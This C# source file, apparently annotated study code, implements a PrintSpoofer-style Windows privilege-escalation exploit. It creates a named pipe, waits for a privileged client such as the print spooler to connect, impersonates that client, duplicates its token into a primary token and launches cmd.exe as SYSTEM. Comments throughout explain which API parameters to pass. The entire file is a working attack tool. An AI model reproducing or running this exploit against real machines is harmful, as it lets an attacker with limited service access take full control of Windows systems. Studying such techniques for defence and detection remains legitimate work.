using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {
        //CreateNamedPipe
        /*
         HANDLE CreateNamedPipeA(
            LPCSTR lpName, -> pipe name, must use standardized name format \\.\pipe\pipename)
            DWORD dwOpenMode, pipe opened mode, we want bidirectional pipe with the PIPE_ACCESS_DUPLEX, set to 3
            DWORD dwPipeMode,  pipe operation mode,  we want PIPE_TYPE_BYTE to directly write and read bytes along with PIPE_WAIT to enable blocking mode,
        This will allow us to listen on the pipe until it receives a connection, set to 0
        
            DWORD nMaxInstances, -> max instances, between 0 and 255
            DWORD nOutBufferSize, -> buffer for output, set to one memory page should be enough 0x1000 
            DWORD nInBufferSize, -> buffer for input, set to one memory page should be enough 0x1000 
            DWORD nDefaultTimeOut, -> don't care, set to default 0
            LPSECURITY_ATTRIBUTES lpSecurityAttributes -> SID detailing which clients can interact with the pipe, pass NULL to allow local admin and System only
          );
         
         */
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        /*
         Enables a named pipe server process to wait for a client process to connect to an instance of a named pipe.  
         BOOL ConnectNamedPipe(
            HANDLE hNamedPipe, -> pipe handle
            LPOVERLAPPED lpOverlapped -> a pointer to a structure used in more advanced cases, we can use null 
         );
        */
        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        //import ImpersonateNamedPipeClient
        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        /*
         BOOL OpenThreadToken(
            HANDLE ThreadHandle, -> thread handle for token, We will use GetCurrentThread
            DWORD DesiredAccess, -> set to TOKEN_ALL_ACCESS 0xF01FF
            BOOL OpenAsSelf, ->whether the API should use the security context of the process or the thread, set to false, we want to use the imperonated token
            PHANDLE TokenHandle -> a pointer (TokenHandle) to the token that is opended
          );
         */
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        /*
         We will import GetTokenInformation to access, so we can print  SID to verify our current access

        BOOL GetTokenInformation(
            HANDLE TokenHandle, -> pointer to token 
            TOKEN_INFORMATION_CLASS TokenInformationClass, ->speficies type of information we want to obtain, we can pass TokenUser to retrive SID, numerical value of 1
            LPVOID TokenInformation, ->  pointer to output
            DWORD TokenInformationLength, -> size of output buffer, since we don't know the required size, the recommended way of using this API is to call it twice, the first call set 2 argus to null and 0
            PDWORD ReturnLength -> the return length will populat required size in
         );
         */
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        //ConvertSidToStringSid to convert the binary SID to a SID string
        /*
         BOOL ConvertSidToStringSidW(
            PSID Sid, ->a pointer to the SID, we must extract if from GetTokeninformation
            LPWSTR *StringSid -> the output string
            );
         */

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }
        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }
        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);


        /*
         call DuplicateTokenEx to convert the impersonation token to a primary token

        BOOL DuplicateTokenEx(
            HANDLE hExistingToken, -> the impersonation token handle
            DWORD dwDesiredAccess, -> full access 0xf01ff
            LPSECURITY_ATTRIBUTES lpTokenAttributes, ->use default security descriptor, set to NULL
            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, access type, we want securityimpersonation with value 2
            TOKEN_TYPE TokenType, 1 for primary token
            PHANDLE phNewToken ->pointer to duplicated token
        );

         */
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        /*
         CreateProcessWithToken, we can use this to create a command prompt as SYSTEM
        BOOL CreateProcessWithTokenW(
            HANDLE hToken,
            DWORD dwLogonFlags,-> set to default of 0
            LPCWSTR lpApplicationName, -> nulll
            LPWSTR lpCommandLine, -> set cmd.exe full path
            DWORD dwCreationFlags, -> 0,defualt setting 
            LPVOID lpEnvironment, -> null,defualt setting 
            LPCWSTR lpCurrentDirectory, -> null ,defualt setting 
            LPSTARTUPINFOW lpStartupInfo, -> we need to pass the structure
            LPPROCESS_INFORMATION lpProcessInformation -> we need to pass the structur
         );
         */

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        static void Main(string[] args)
        {

            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }

            string pipeName = args[0];
            //create the name pipe
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000,0x1000, 0, IntPtr.Zero);

            //wait for incoming pipe clinet
            ConnectNamedPipe(hPipe, IntPtr.Zero);

            //impersonate connected client
            ImpersonateNamedPipeClient(hPipe);

            //create token pointer to our impersonated token
            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);

            //use Marshal.AllocHGlobal method which can allocate unmanaged memory
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            
            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation,typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            //supply an empty pointer and once it gets populated, marshal it to a C# string
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            //print our sid information
            //Console.WriteLine(@"Found sid {0}", sidstr);

            //duplicate the token and set to primary token
            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            //kick off a command prompt
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
        }
    }
}
